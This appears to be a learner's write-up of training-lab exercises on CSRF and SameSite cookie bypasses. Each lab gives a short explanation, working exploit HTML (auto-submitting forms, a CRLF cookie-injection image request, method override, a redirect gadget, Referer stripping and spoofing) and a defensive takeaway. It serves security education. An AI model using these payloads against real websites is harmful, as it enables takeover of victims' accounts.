## Lab 01: CSRF Vulnerability with No Defenses

This lab showed a basic CSRF vulnerability in the email change function.

The endpoint was:

```text
/my-account/change-email
```

It accepted a POST request with only an `email` parameter and did not require a CSRF token.

The exploit used an auto-submitting form:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-new@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

I first tested the exploit using **View exploit**, and it changed my own email.

Then I changed the email value and used **Deliver to victim**, which solved the lab.

### Key Takeaway

CSRF happens when a malicious page causes a logged-in user's browser to send an unwanted request.

If sensitive actions do not require a CSRF token, they can be triggered from another website.

## Lab 02: CSRF Where Token Validation Depends on Request Method

This lab showed a CSRF weakness caused by method-based validation.

The application checked the CSRF token when the email change request was sent as POST.

However, when the request was changed to GET, the token was not checked.

The exploit used a GET form:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-method@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Because the form had no `method` attribute, it submitted the request as GET.

### Key Takeaway

CSRF protection should not depend only on the request method.

Any request that changes data must require proper CSRF protection.


## Lab 03: CSRF Where Token Validation Depends on Token Being Present

This lab showed a CSRF flaw where the application only checked the CSRF token if it was present.

If the token value was wrong, the request was rejected.

But if the token parameter was removed completely, the request was accepted.

The exploit used a POST form without any CSRF token:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-missing@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

### Key Takeaway

A CSRF token must always be required for sensitive actions.

If the token is missing, the request should be rejected immediately.

## Lab 04: CSRF Where Token Is Not Tied to User Session

This lab showed a CSRF weakness where the token was valid but not linked to the user's session.

A secure CSRF token should only work with the session it was created for.

In this lab, a token from one account could be accepted in another user's request.

The exploit used a fresh unused CSRF token from my own account:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-session@test.com">
    <input type="hidden" name="csrf" value="FRESH-CSRF-TOKEN">
</form>

<script>
    document.forms[0].submit();
</script>
```

I copied the token from an intercepted request and dropped the request so the token would not be consumed.

Then I used the token in the exploit and delivered it to the victim.

### Key Takeaway

CSRF tokens must be tied to the user's session.

A valid token from one account should not work in another user's session.

## Lab 05: CSRF Where Token Is Tied to Non-Session Cookie

This lab showed a CSRF weakness where the token was tied to a separate cookie called `csrfKey`, not to the user's session.

The application accepted the request when:

```text
csrf token matches csrfKey cookie
```

But it did not properly check whether they belonged to the current logged-in user.

The exploit used two parts:

```text
1. Set the victim's csrfKey cookie.
2. Submit the email change form with the matching csrf token.
```

The exploit was:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-final-test@test.com">
    <input type="hidden" name="csrf" value="PASTE-CSRF-TOKEN-HERE">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=PASTE-CSRFKEY-HERE%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

The image request planted the `csrfKey` cookie.

Then `onerror` submitted the form automatically.

### Key Takeaway

A CSRF token should be tied to the user's session.

If the token is only tied to a separate cookie, an attacker may be able to plant that cookie and reuse a valid token.

## Lab 06: CSRF Where Token Is Duplicated in Cookie

This lab showed a weakness in the double submit cookie CSRF defense.

The application accepted the request when:

```text
csrf cookie value = csrf form value
```

The exploit used the same attacker-controlled value in both places:

```text
csrf=fake
```

The exploit was:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-duplicate-test@test.com">
    <input type="hidden" name="csrf" value="fake">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

The image request planted the `csrf=fake` cookie.

Then `onerror` submitted the form with the same `csrf=fake` value.

### Key Takeaway

Double submit cookie protection is not safe if the attacker can set or control the CSRF cookie.

A CSRF token should be tied to the user's session, not only compared with a cookie value.

## Lab 07: SameSite Lax Bypass via Method Override

This lab showed how SameSite Lax can be bypassed using method override.

SameSite Lax blocks cookies on cross-site POST requests, but it allows cookies on top-level GET navigation.

The exploit used:

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=victim-samesite%40test.com&_method=POST";
</script>
```

The request was sent as a GET request, so the session cookie was included.

Then the server used:

```text
_method=POST
```

and treated the request like a POST request.

### Key Takeaway

SameSite Lax is not enough if the application allows state-changing actions through GET requests or method override.

## Lab 08: SameSite Strict Bypass via Client-Side Redirect

This lab showed how `SameSite=Strict` can be bypassed using a client-side redirect gadget.

The site had a redirect page:

```text
/post/comment/confirmation?postId=
```

The JavaScript on this page used the `postId` value to redirect the user.

By controlling `postId`, the exploit redirected the victim to:

```text
/my-account/change-email
```

The exploit was:

```html
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=victim-strict-bypass%40test.com%26submit=1";
</script>
```

The important part was:

```text
1/../../my-account/change-email
```

This used path traversal to make the redirect reach the email change endpoint.

### Key Takeaway

`SameSite=Strict` helps reduce CSRF, but it is not enough if the application has a redirect gadget that can trigger same-site requests to sensitive endpoints.


## Pending Lab-09: SameSite Strict Bypass via Sibling Domain

Status: Pending - Tool Limitation

This lab requires Burp Collaborator / Burp Suite Professional because the intended solution exfiltrates the victim's WebSocket chat history to the Collaborator server.

The lab was reviewed conceptually. It combines SameSite Strict bypass, reflected XSS on a sibling domain, and cross-site WebSocket hijacking.

It will be revisited later when Burp Collaborator access is available.

## Lab 10: SameSite Lax Bypass via Cookie Refresh

This lab showed how `SameSite=Lax` can be bypassed by refreshing the session cookie.

The application used OAuth login.

OAuth login means the user logs in through another trusted service, then the website creates a session cookie after the login finishes.

The exploit used this behavior by opening:

```text id="lngai2"
/social-login
```

This refreshed the victim's session cookie.

Then the exploit waited 5 seconds and submitted the email change form:

```html id="fj6q7d"
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="samesite-refresh@test.com">
</form>

<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

The user click was needed because browsers block popups unless they are triggered by user interaction.

### Key Takeaway

`SameSite=Lax` helps reduce CSRF, but it should not replace CSRF tokens.

A fresh session cookie can still allow a cross-site POST request for a short time.

## Lab 11: CSRF Where Referer Validation Depends on Header Being Present

This lab showed a weak CSRF defense based on the `Referer` header.

The `Referer` header tells the server where the request came from.

The application rejected the request when the `Referer` was external:

```text id="ez7fy1"
Referer: https://evil.com
```

But it accepted the request when the `Referer` header was missing.

The exploit used:

```html id="eucshh"
<meta name="referrer" content="no-referrer">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="referer-final@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

The meta tag removed the `Referer` header, and the form submitted the email change request.

### Key Takeaway

`Referer` validation should not be used as the main CSRF protection.

If the application accepts requests with a missing `Referer`, the protection can be bypassed.

## Lab 12: CSRF with Broken Referer Validation

This lab showed a weak `Referer` validation check.

The application rejected this:

```text id="ymflv4"
Referer: https://evil.com
```

But accepted this:

```text id="kcjbup"
Referer: https://evil.com?YOUR-LAB-ID.web-security-academy.net
```

The issue was that the application only checked whether the expected domain appeared somewhere in the `Referer` header.

The exploit used:

```html id="w73jax"
<script>
    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
</script>

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="broken-referer@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

The Exploit Server head section used:

```text id="dean7o"
Referrer-Policy: unsafe-url
```

This made the browser include the full exploit URL in the `Referer` header.

### Key Takeaway

`Referer` validation must check the real origin properly.

It is insecure to only check whether the trusted domain appears somewhere in the header value.
